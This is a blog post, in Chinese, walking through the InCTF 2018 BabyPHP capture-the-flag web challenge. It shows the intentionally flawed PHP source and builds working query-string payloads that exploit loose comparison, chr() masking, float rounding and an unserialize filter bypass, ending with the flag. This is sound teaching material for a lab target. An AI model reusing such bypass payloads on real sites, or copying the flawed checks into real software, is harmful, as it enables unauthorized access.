@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>InCTF2018-BabyPHP | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">InCTF2018-BabyPHP</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 26, 2020&nbsp;&nbsp;20:32:11</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><ol>
+<li>php弱类型比较</li>
+<li>超精度浮点数将被转换为整数</li>
+<li>php字母转数字比较</li>
+</ol>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line">$a = $_GET[<span class="string">'key1'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">56</span> || $a&gt;<span class="number">256</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"Really???"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(chr($a)===<span class="string">"8"</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Carry on"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag1 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You are not good"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = $_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($b,<span class="string">'8'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"It won't be that easy"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1</span>;$i++)&#123;</span><br><span class="line">  ++$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b==<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Good luck"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag2 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"No Luck"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$m = md5($_GET[<span class="string">'rq'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'fp'</span>] == $m)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag3.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($fp))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You failed"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$n = hash(<span class="string">'ripemd160'</span>,$_GET[<span class="string">'np'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'nq'</span>] === $n)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag4.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($np))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You failed"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hell=$_GET[<span class="string">'key3'</span>];</span><br><span class="line"><span class="keyword">if</span>(strpos($hell, <span class="string">'i'</span>)!==<span class="keyword">false</span> || strpos($hell, <span class="string">'I'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You...can't..."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$data = unserialize($hell);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'username'</span>] == $adminName &amp;&amp; $data[<span class="string">'password'</span>] == $adminPassword) &#123;</span><br><span class="line"> <span class="keyword">echo</span> $flag5 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">"useless"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag是由五部分组成的，<code>$flag1</code>，<code>$flag2</code>，<code>$flag3</code>，<code>$flag4</code>和<code>$flag5</code>，得到这些<code>$flag</code>变量需要绕过一些限制条件。</p>
+<h5 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$a = $_GET[<span class="string">'key1'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">56</span> || $a&gt;<span class="number">256</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"Really???"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(chr($a)===<span class="string">"8"</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Carry on"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag1 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You are not good"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取<code>$flag1</code>变量需要满足几个条件：</p>
+<ol>
+<li><code>$a</code>和数字<code>56</code>弱类型比较之后不相等，也就是说<code>$a</code>不能为56，也不能为<code>56aaa</code>等值，而且<code>$a</code>不能大于<code>256</code>；</li>
+<li><code>chr($a) === &quot;8&quot;</code>，但是<code>&quot;8&quot;</code>对应的ascii码值是<code>56</code>。</li>
+</ol>
+<p>也就是说变量<code>$a</code>的经过<code>chr</code>函数计算后的值是<code>56</code>，但是<code>$a</code>本身不能是56。</p>
+<p>我们先看一下<code>chr</code>函数的实现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; proto string chr(int ascii)</span></span><br><span class="line"><span class="comment">   Converts ASCII code to a character</span></span><br><span class="line"><span class="comment">   Warning: This function is special-cased by zend_compile.c and so is bypassed for constant integer argument */</span></span><br><span class="line">PHP_FUNCTION(chr)</span><br><span class="line">&#123;</span><br><span class="line">	zend_long c;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_LONG(c)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	c &amp;= <span class="number">0xff</span>;</span><br><span class="line">	ZVAL_INTERNED_STR(return_value, ZSTR_CHAR(c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>
+
+<p>在第12行可以看到，chr函数会对传入的值先进行<code>&amp;</code>操作确保传入的ascii码不会大于<code>255</code>，也就是相当于对传入<code>chr</code>函数的值进行一个模操作来确保ascii值不会超过<code>255</code>。</p>
+<p>因为题目中要求<code>$a</code>不能大于<code>256</code>，所以我们可以推测<code>$a</code>一定小于0，<code>-200</code>就符合题目的要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-200</span><br><span class="line">100111000</span><br><span class="line">011111111</span><br><span class="line">---------</span><br><span class="line">000111000</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>chr(-200) = chr(56) = 8</code></p>
+<p>当前对应的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1&#x3D;-200</span><br></pre></td></tr></table></figure>
+
+<h5 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$b = $_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($b,<span class="string">'8'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"It won't be that easy"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1</span>;$i++)&#123;</span><br><span class="line">  ++$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b==<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Good luck"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> $flag2 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"No Luck"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第6行~第8行的代码会将变量<code>$b</code>加2，在第9行将<code>$b</code>和<code>10</code>进行弱类型比较，如果相等，则输出<code>$flag2</code>。</p>
+<p>但是在第3行要求变量<code>$b</code>不能为8。这里涉及到的是数据类型精度的考察。</p>
+<p>对于<code>==</code>的弱类型比较，php会先读取这个浮点数，然后进行类型转换。当给定的浮点数的精度超过了<code>double</code>类型的精度（小数点后15位）时，就会进行四舍五入取整操作。</p>
+<p>这不是php的问题，这是double数据类型的数据精度问题。所以要绕过<code>if(strpos($b,&#39;8&#39;)!==false)</code>比较，应该令<code>$b=7.999999999999999999</code>。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1&#x3D;-200&amp;key2&#x3D;7.999999999999999999</span><br></pre></td></tr></table></figure>
+
+<h5 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$m = md5($_GET[<span class="string">'rq'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'fp'</span>] == $m)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag3.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($fp))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个没什么难点，接受两个get请求参数<code>$_GET{&#39;rq&#39;]}</code>和<code>$_GET[&#39;fp&#39;]</code>，只要满足<code>md5($_GET[&#39;rq&#39;]) == $_GET{fp]}</code>即可，随便令<code>rq</code>等于一个值，计算它的<code>md5</code>值赋给<code>fp</code>即可。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1&#x3D;-200&amp;key2&#x3D;7.999999999999999999&amp;rq&#x3D;111&amp;fp&#x3D;698d51a19d8a121ce581499d7b701668</span><br></pre></td></tr></table></figure>
+
+<h5 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$n = hash(<span class="string">'ripemd160'</span>,$_GET[<span class="string">'np'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'nq'</span>] === $n)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag4.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>($np))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这和上一层一样，<code>ropemd160</code>是一种单向散列加密哈希函数，直接计算：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$np = <span class="string">"222"</span>;</span><br><span class="line">$n = hash(<span class="string">'ripemd160'</span>, $np);</span><br><span class="line"><span class="keyword">echo</span> $n;</span><br><span class="line"><span class="comment">// $n = 5f987b94e565af0394c6d6a64e2bdee6797728b1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1&#x3D;-200&amp;key2&#x3D;7.999999999999999999&amp;rq&#x3D;111&amp;fp&#x3D;698d51a19d8a121ce581499d7b701668&amp;np&#x3D;222&amp;nq&#x3D;5f987b94e565af0394c6d6a64e2bdee6797728b1</span><br></pre></td></tr></table></figure>
+
+<h5 id="第五层"><a href="#第五层" class="headerlink" title="第五层"></a>第五层</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$hell=$_GET[<span class="string">'key3'</span>];</span><br><span class="line"><span class="keyword">if</span>(strpos($hell, <span class="string">'i'</span>)!==<span class="keyword">false</span> || strpos($hell, <span class="string">'I'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"You...can't..."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$data = unserialize($hell);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'username'</span>] == $adminName &amp;&amp; $data[<span class="string">'password'</span>] == $adminPassword) &#123;</span><br><span class="line"> <span class="keyword">echo</span> $flag5 . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">"useless"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码绕过第2个if需要使<code>$data[&#39;username&#39;] == $adminName</code>及<code>$data[&#39;password&#39;] == $adminPassword</code>。但是我们并不知道<code>$adminName</code>和<code>$adminPassword</code>是什么。但是可以注意到的是进行的弱类型比较，所以猜测<code>$adminName</code>和<code>$adminPassword</code>是字母开头的。</p>
+<p>在php中，如果是字符串和数字进行比较，php会把字符串强制转换为数字，对于字母开头的字符串，转换后就是<code>0</code>。</p>
+<p>我们知道php反序列化对象类型有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
+
+<p>所以我们构造一个反序列化字符串，对象类型是array：<code>a</code>，有两个键，<code>username</code>和<code>password</code>，数据类型是整型integer：<code>i</code>，但是<code>i</code>被过滤了（代码第2行），但是可以用double来替换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key1&#x3D;-200&amp;key2&#x3D;7.999999999999999999&amp;rq&#x3D;111&amp;fp&#x3D;698d51a19d8a121ce581499d7b701668&amp;np&#x3D;222&amp;nq&#x3D;5f987b94e565af0394c6d6a64e2bdee6797728b1&amp;key3&#x3D;a:2:&#123;s:8:&quot;username&quot;;d:0;s:8:&quot;password&quot;;d:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Carry on</span><br><span class="line">inctf&#123;y</span><br><span class="line">Good luck</span><br><span class="line">0u_f0u</span><br><span class="line">nd_17_</span><br><span class="line">bu65_</span><br><span class="line">c00l!!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整合一下就是最后的flag：<code>inctf{y0u_f0und_17_bu65_c00l!!}</code>。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/04/26/InCTF-2018-BabyPHP/">https://bantttian.github.io/2020/04/26/InCTF-2018-BabyPHP/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/">InCTF2019-PHP1.0+PHP1.5</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/23/OverTheWire-Natas-Walkthrough-2/">OverTheWire Natas Walkthrough-2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
